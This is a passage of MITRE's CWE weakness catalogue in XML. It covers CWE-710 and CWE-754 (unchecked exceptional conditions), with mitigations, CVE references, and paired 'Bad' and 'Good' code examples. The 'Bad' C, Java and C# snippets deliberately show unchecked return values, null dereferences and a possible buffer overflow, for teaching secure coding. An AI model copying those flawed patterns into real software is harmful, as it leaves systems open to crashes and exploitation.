					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Description, Name, Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-07-16</Modification_Date>
					<Modification_Version>4.15</Modification_Version>
					<Modification_ReleaseDate>2024-07-16</Modification_ReleaseDate>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2009-05-27">Failure to Enforce that Messages or Data are Well-Formed</Previous_Entry_Name>
			<Previous_Entry_Name Date="2020-02-24">Improper Enforcement of Message or Data Structure</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="710" Name="Improper Adherence to Coding Standards" Abstraction="Pillar" Structure="Simple" Status="Incomplete">
         <Description>The product does not follow certain coding rules for development, which can lead to resultant weaknesses or increase the severity of the associated vulnerabilities.</Description>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Other</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Document and closely follow coding standards.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Phase>Implementation</Phase>
               <Description>Where possible, use automated tools to enforce the standards.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Mapping_Notes>
            <Usage>Discouraged</Usage>
            <Rationale>This CWE entry is extremely high-level, a Pillar.</Rationale>
            <Comments>Consider children or descendants of this entry instead.</Comments>
            <Reasons>
               <Reason Type="Abstraction"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2008-09-09</Submission_Date>
               <Submission_Version>1.0</Submission_Version>
               <Submission_ReleaseDate>2008-09-09</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Name, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2017-11-08">Coding Standards Violation</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="754" Name="Improper Check for Unusual or Exceptional Conditions" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The product does not check or incorrectly checks for unusual or exceptional conditions that are not expected to occur frequently during day to day operation of the product.</Description>
         <Extended_Description>
            <xhtml:p>The programmer may assume that certain events or conditions will never occur or do not need to be worried about, such as low memory conditions, lack of access to resources due to restrictive permissions, or misbehaving clients or components. However, attackers may intentionally trigger these unusual conditions, thus violating the programmer's assumptions, possibly introducing instability, incorrect behavior, or a vulnerability.</xhtml:p>
            <xhtml:p>Note that this entry is not exclusively about the use of exceptions and exception handling, which are mechanisms for both checking and handling unusual or unexpected conditions.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="703" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="416" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>Many functions will return some value about the success of their actions. This will alert the program whether or not to handle any errors caused by that function.</Background_Detail>
         </Background_Details>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Impact>Unexpected State</Impact>
               <Note>The data which were produced as a result of a function call could be in a bad state upon return. If the return value is not checked, then this bad data may be used in operations, possibly leading to a crash or other unintended behaviors.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>Automated static analysis may be useful for detecting unusual conditions involving system resources or common programming idioms, but not for violations of business rules.</Description>
               <Effectiveness>Moderate</Effectiveness>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-12">
               <Method>Manual Dynamic Analysis</Method>
               <Description>Identify error conditions that are not likely to occur during normal usage and trigger them. For example, run the program under low memory conditions, run with insufficient privileges or permissions, interrupt a transaction before it is completed, or disable connectivity to basic network services such as DNS. Monitor the software for any unexpected behavior. If you trigger an unhandled exception or similar error that was discovered and handled by the application's environment, it may still indicate unexpected conditions that were not handled by the application itself.</Description>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-3">
               <Phase>Requirements</Phase>
               <Strategy>Language Selection</Strategy>
               <Description>
                  <xhtml:p>Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>Choose languages with features such as exception handling that force the programmer to anticipate unusual conditions that may generate exceptions. Custom exceptions may need to be developed to handle unusual business-logic conditions. Be careful not to pass sensitive exceptions back to the user (CWE-209, CWE-248).</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Check the results of all functions that return a value and verify that the value is expected.</Description>
               <Effectiveness>High</Effectiveness>
               <Effectiveness_Notes>Checking the return value of the function will typically be sufficient, however beware of race conditions (CWE-362) in a concurrent environment.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>If using exception handling, catch and throw specific exceptions instead of overly-general exceptions (CWE-396, CWE-397). Catch and handle exceptions as locally as possible so that exceptions do not propagate too far up the call stack (CWE-705). Avoid unchecked or uncaught exceptions where feasible (CWE-248).</Description>
               <Effectiveness>High</Effectiveness>
               <Effectiveness_Notes>Using specific exceptions, and ensuring that exceptions are checked, helps programmers to anticipate and appropriately handle many unusual events that could occur.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-39">
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Ensure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success.</xhtml:p>
                  <xhtml:p>If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files.</xhtml:p>
		  <xhtml:p>Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not.</xhtml:p>
		  <xhtml:p>Exposing additional information to a potential attacker in the context of an exceptional condition can help the attacker determine what attack vectors are most likely to succeed beyond DoS.</xhtml:p>
	       </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
               <Effectiveness_Notes>Performing extensive input validation does not help with handling unusual conditions, but it will minimize their occurrences and will make it more difficult for attackers to trigger them.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-38">
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Description>If the program must fail, ensure that it fails gracefully (fails closed). There may be a temptation to simply let the program fail poorly in cases such as low memory conditions, but an attacker may be able to assert control before the software has fully exited. Alternately, an uncontrolled failure could cause cascading problems with other downstream components; for example, the program could send a signal to a downstream process so the process immediately knows that a problem has occurred and has a better chance of recovery.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Use system limits, which should help to prevent resource exhaustion. However, the product should still handle low resource conditions since they may still occur.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-7">
               <Intro_Text>Consider the following code segment:</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>char buf[10], cp_buf[10];<xhtml:br/>fgets(buf, 10, stdin);<xhtml:br/>strcpy(cp_buf, buf);</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer expects that when fgets() returns, buf will contain a null-terminated string of length 9 or less. But if an I/O error occurs, fgets() will not null-terminate buf. Furthermore, if the end of the file is reached before any characters are read, fgets() returns without writing anything to buf. In both of these situations, fgets() signals that something unusual has happened by returning NULL, but in this code, the warning will not be noticed. The lack of a null terminator in buf can result in a buffer overflow in the subsequent call to strcpy().</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-8">
               <Intro_Text>The following code does not check to see if memory allocation succeeded before attempting to use the pointer returned by malloc().</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>buf = (char*) malloc(req_size);<xhtml:br/>strncpy(buf, xfer, req_size);</xhtml:div>
               </Example_Code>
               <Body_Text>The traditional defense of this coding error is: "If my program runs out of memory, it will fail. It doesn't matter whether I handle the error or simply allow the program to die with a segmentation fault when it tries to dereference the null pointer." This argument ignores three important considerations:</Body_Text>
               <Body_Text>
                  <xhtml:ul>
                     <xhtml:li>
                        <xhtml:div>Depending upon the type and size of the application, it may be possible to free memory that is being used elsewhere so that execution can continue.</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>It is impossible for the program to perform a graceful exit if required. If the program is performing an atomic operation, it can leave the system in an inconsistent state.</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>The programmer has lost the opportunity to record diagnostic information. Did the call to malloc() fail because req_size was too large or because there were too many requests being handled at the same time? Or was it caused by a memory leak that has built up over time? Without handling the error, there is no way to know.</xhtml:div>
                     </xhtml:li>
                  </xhtml:ul>
               </Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-9">
               <Intro_Text>The following examples read a file into a byte array.</Intro_Text>
               <Example_Code Nature="Bad" Language="C#">
                  <xhtml:div>char[] byteArray = new char[1024];<xhtml:br/>for (IEnumerator i=users.GetEnumerator(); i.MoveNext() ;i.Current()) {<xhtml:div style="margin-left:1em;">String userName = (String) i.Current();<xhtml:br/>String pFileName = PFILE_ROOT + "/" + userName;<xhtml:br/>StreamReader sr = new StreamReader(pFileName);<xhtml:br/>sr.Read(byteArray,0,1024);//the file is always 1k bytes<xhtml:br/>sr.Close();<xhtml:br/>processPFile(userName, byteArray);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>FileInputStream fis;<xhtml:br/>byte[] byteArray = new byte[1024];<xhtml:br/>for (Iterator i=users.iterator(); i.hasNext();) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>String userName = (String) i.next();<xhtml:br/>String pFileName = PFILE_ROOT + "/" + userName;<xhtml:br/>FileInputStream fis = new FileInputStream(pFileName);<xhtml:br/>fis.read(byteArray); // the file is always 1k bytes<xhtml:br/>fis.close();<xhtml:br/>processPFile(userName, byteArray);<xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>The code loops through a set of users, reading a private data file for each user. The programmer assumes that the files are always 1 kilobyte in size and therefore ignores the return value from Read(). If an attacker can create a smaller file, the program will recycle the remainder of the data from the previous user and treat it as though it belongs to the attacker.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-10">
               <Intro_Text>The following code does not check to see if the string returned by getParameter() is null before calling the member function compareTo(), potentially causing a NULL dereference.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String itemName = request.getParameter(ITEM_NAME);<xhtml:br/>if (itemName.compareTo(IMPORTANT_ITEM) == 0) {<xhtml:div style="margin-left:1em;">...</xhtml:div>}<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The following code does not check to see if the string returned by the Item property is null before calling the member function Equals(), potentially causing a NULL dereference.</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String itemName = request.Item(ITEM_NAME);<xhtml:br/>if (itemName.Equals(IMPORTANT_ITEM)) {<xhtml:div style="margin-left:1em;">...</xhtml:div>}<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The traditional defense of this coding error is: "I know the requested value will always exist because.... If it does not exist, the program cannot perform the desired behavior so it doesn't matter whether I handle the error or simply allow the program to die dereferencing a null value." But attackers are skilled at finding unexpected paths through programs, particularly when exceptions are involved.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-11">
               <Intro_Text>The following code shows a system property that is set to null and later dereferenced by a programmer who mistakenly assumes it will always be defined.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>System.clearProperty("os.name");<xhtml:br/>...<xhtml:br/>String os = System.getProperty("os.name");<xhtml:br/>if (os.equalsIgnoreCase("Windows 95")) System.out.println("Not supported");</xhtml:div>
               </Example_Code>
               <Body_Text>The traditional defense of this coding error is: "I know the requested value will always exist because.... If it does not exist, the program cannot perform the desired behavior so it doesn't matter whether I handle the error or simply allow the program to die dereferencing a null value." But attackers are skilled at finding unexpected paths through programs, particularly when exceptions are involved.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-12">
               <Intro_Text>The following VB.NET code does not check to make sure that it has read 50 bytes from myfile.txt. This can cause DoDangerousOperation() to operate on an unexpected value.</Intro_Text>
               <Example_Code Nature="Bad" Language="C#">
                  <xhtml:div>Dim MyFile As New FileStream("myfile.txt", FileMode.Open, FileAccess.Read, FileShare.Read)<xhtml:br/>Dim MyArray(50) As Byte<xhtml:br/>MyFile.Read(MyArray, 0, 50)<xhtml:br/>DoDangerousOperation(MyArray(20))</xhtml:div>
               </Example_Code>
               <Body_Text>In .NET, it is not uncommon for programmers to misunderstand Read() and related methods that are part of many System.IO classes. The stream and reader classes do not consider it to be unusual or exceptional if only a small amount of data becomes available. These classes simply add the small amount of data to the return buffer, and set the return value to the number of bytes or characters read. There is no guarantee that the amount of data returned is equal to the amount of data requested.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-1">
               <Intro_Text>This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>void host_lookup(char *user_supplied_addr){<xhtml:div style="margin-left:1em;">
                        <xhtml:div>struct hostent *hp;<xhtml:br/>in_addr_t *addr;<xhtml:br/>char hostname[64];<xhtml:br/>in_addr_t inet_addr(const char *cp);<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>/*routine that ensures user_supplied_addr is in the right format for conversion */</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>validate_addr_form(user_supplied_addr);<xhtml:br/>addr = inet_addr(user_supplied_addr);<xhtml:br/>hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);<xhtml:br/>strcpy(hostname, hp-&gt;h_name);</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>If an attacker provides an address that appears to be well-formed, but the address does not resolve to a hostname, then the call to gethostbyaddr() will return NULL. Since the code does not check the return value from gethostbyaddr (CWE-252), a NULL pointer dereference
	       (CWE-476) would then occur in the call to strcpy().</Body_Text>
               <Body_Text>Note that this code is also vulnerable to a buffer overflow (CWE-119).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In the following C/C++ example the method outputStringToFile opens a file in the local filesystem and outputs a string to the file. The input parameters output and filename contain the string to output to the file and the name of the file respectively.</Intro_Text>
               <Example_Code Nature="Bad" Language="C++">
                  <xhtml:div>int outputStringToFile(char *output, char *filename) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>openFileToWrite(filename);<xhtml:br/>writeToFile(output);<xhtml:br/>closeFile(filename);</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>However, this code does not check the return values of the methods openFileToWrite, writeToFile, closeFile to verify that the file was properly opened and closed and that the string was successfully written to the file. The return values for these methods should be checked to determine if the method was successful and allow for detection of errors or unexpected conditions as in the following example.</Body_Text>
               <Example_Code Nature="Good" Language="C++">
                  <xhtml:div>int outputStringToFile(char *output, char *filename) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>int isOutput = SUCCESS;<xhtml:br/>
                           <xhtml:br/>int isOpen = openFileToWrite(filename);<xhtml:br/>if (isOpen == FAIL) {<xhtml:div style="margin-left:1em;">printf("Unable to open file %s", filename);<xhtml:br/>isOutput = FAIL;</xhtml:div>}<xhtml:br/>else {<xhtml:div style="margin-left:1em;">
                              <xhtml:div>int isWrite = writeToFile(output);<xhtml:br/>if (isWrite == FAIL) {<xhtml:div style="margin-left:1em;">printf("Unable to write to file %s", filename);<xhtml:br/>isOutput = FAIL;</xhtml:div>}<xhtml:br/>
                                 <xhtml:br/>int isClose = closeFile(filename);<xhtml:br/>if (isClose == FAIL)<xhtml:div style="margin-left:1em;">isOutput = FAIL;</xhtml:div>
                              </xhtml:div>
                           </xhtml:div>}<xhtml:br/>return isOutput;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In the following Java example the method readFromFile uses a FileReader object to read the contents of a file. The FileReader object is created using the File object readFile, the readFile object is initialized using the setInputFile method. The setInputFile method should be called before calling the readFromFile method.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>private File readFile = null;<xhtml:br/>
                     <xhtml:br/>public void setInputFile(String inputFile) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>// create readFile File object from string containing name of file</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>public void readFromFile() {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>try {<xhtml:div style="margin-left:1em;">
                              <xhtml:div>reader = new FileReader(readFile);<xhtml:br/>
                                 <xhtml:br/>
                                 <xhtml:i>// read input file</xhtml:i>
                                 <xhtml:br/>
                              </xhtml:div>
                           </xhtml:div>} catch (FileNotFoundException ex) {...}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>However, the readFromFile method does not check to see if the readFile object is null, i.e. has not been initialized, before creating the FileReader object and reading from the input file. The readFromFile method should verify whether the readFile object is null and output an error message and raise an exception if the readFile object is null, as in the following code.</Body_Text>
               <Example_Code Nature="Good" Language="Java">
                  <xhtml:div>private File readFile = null;<xhtml:br/>
                     <xhtml:br/>public void setInputFile(String inputFile) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>// create readFile File object from string containing name of file</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>public void readFromFile() {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>try {<xhtml:div style="margin-left:1em;">
                              <xhtml:div>if (readFile == null) {<xhtml:div style="margin-left:1em;">System.err.println("Input file has not been set, call setInputFile method before calling openInputFile");<xhtml:br/>throw NullPointerException;</xhtml:div>}<xhtml:br/>
                                 <xhtml:br/>reader = new FileReader(readFile);<xhtml:br/>
                                 <xhtml:br/>
                                 <xhtml:i>// read input file</xhtml:i>
                                 <xhtml:br/>
                              </xhtml:div>
                           </xhtml:div>} catch (FileNotFoundException ex) {...}<xhtml:br/>catch (NullPointerException ex) {...}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2023-49286</Reference>
               <Description>Chain: function in web caching proxy does not correctly check a return value (CWE-253) leading to a reachable assertion (CWE-617)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2023-49286</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-3798</Reference>
               <Description>Unchecked return value leads to resultant integer overflow and code execution.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-3798</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-4447</Reference>
               <Description>Program does not check return value when invoking functions to drop privileges, which could leave users with higher privileges than expected by forcing those functions to fail.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-4447</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-2916</Reference>
               <Description>Program does not check return value when invoking functions to drop privileges, which could leave users with higher privileges than expected by forcing those functions to fail.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-2916</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="SEI CERT Perl Coding Standard">
               <Entry_ID>EXP31-PL</Entry_ID>
               <Entry_Name>Do not suppress or ignore exceptions</Entry_Name>
               <Mapping_Fit>CWE More Abstract</Mapping_Fit>
            </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 4-2</Entry_ID>
	      <Entry_Name>Req CR 3.5</Entry_Name>
	    </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 4-2</Entry_ID>
	      <Entry_Name>Req CR 3.7</Entry_Name>
	    </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-62" Section="Chapter 7, &#34;Program Building Blocks&#34; Page 341"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 1, &#34;Exceptional Conditions,&#34; Page 22"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 11: Failure to Handle Errors Correctly.&#34; Page 183"/>
            <Reference External_Reference_ID="REF-622"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed-with-Review</Usage>
            <Rationale>This CWE entry is a Class and might have Base-level children that would be more appropriate</Rationale>
            <Comments>Examine children of this entry to see if there is a better fit</Comments>
            <Reasons>
               <Reason Type="Abstraction"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Relationship">Sometimes, when a return value can be used to indicate an error, an unchecked return value is a code-layer instance of a missing application-layer check for exceptional conditions. However, return values are not always needed to communicate exceptional conditions. For example, expiration of resources, values passed by reference, asynchronously modified data, sockets, etc. may indicate exceptional conditions without the use of a return value.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2009-03-03</Submission_Date>
               <Submission_Version>1.3</Submission_Version>
               <Submission_ReleaseDate>2009-03-10</Submission_ReleaseDate>
               <Submission_Comment>New entry for reorganization of CWE-703.</Submission_Comment>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Likelihood_of_Exploit, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
